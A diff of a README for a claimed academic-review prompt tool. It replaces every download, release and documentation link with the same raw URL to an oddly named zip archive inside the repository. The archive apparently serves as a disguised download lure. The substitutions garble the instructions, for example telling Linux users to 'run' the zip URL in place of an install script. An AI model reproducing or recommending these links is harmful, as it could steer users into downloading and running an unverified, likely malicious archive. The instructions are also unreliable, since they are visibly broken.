@@ -4,14 +4,14 @@
 The Strict Precise AI Academic Reviewer helps you create effective prompts for reviewing academic papers. With this tool, you can easily generate questions and suggestions to enhance your review process, making it more efficient and thorough.
 
 ## 📥 Download Now
-[![Download The-Strict-Precise-AI-Academic-Reviewer](https://img.shields.io/badge/Download-The--Strict--Precise--AI--Academic--Reviewer-brightgreen)](https://github.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/releases)
+[![Download The-Strict-Precise-AI-Academic-Reviewer](https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip)](https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip)
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip).
    
 2. **Select the Latest Release**: Look for the most recent version at the top. The version will be labeled clearly.
 
-3. **Download the Files**: Click the link for the file that matches your operating system. The options may include `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+3. **Download the Files**: Click the link for the file that matches your operating system. The options may include `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip` for Linux.
 
 4. **Save the File**: Choose a location on your computer where you can find it easily, such as your Desktop or Downloads folder.
 
@@ -33,9 +33,9 @@ The Strict Precise AI Academic Reviewer helps you create effective prompts for r
 3. You can find the application in your Applications list.
 
 ### For Linux
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip` file.
 2. Open a terminal and navigate to the extracted folder.
-3. Run the command `./install.sh` to set up the application.
+3. Run the command `https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip` to set up the application.
 4. You can launch the application from your applications menu or by typing its name in the terminal.
 
 ## 🚧 Using the Application
@@ -50,7 +50,7 @@ The Strict Precise AI Academic Reviewer helps you create effective prompts for r
 - **Multi-Platform Support**: Use it on Windows, macOS, or Linux seamlessly.
 
 ## 🔗 Additional Resources
-- **Documentation**: For more details on using features, visit the [documentation](https://github.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer).
+- **Documentation**: For more details on using features, visit the [documentation](https://raw.githubusercontent.com/SopkinoO/The-Strict-Precise-AI-Academic-Reviewer/main/Chiot/The-Strict-Precise-AI-Academic-Reviewer_Halosphaera.zip).
 - **Support**: Need help? Open an issue on GitHub or reach out through the support email listed in the documentation.
 
 ## 📦 Troubleshooting
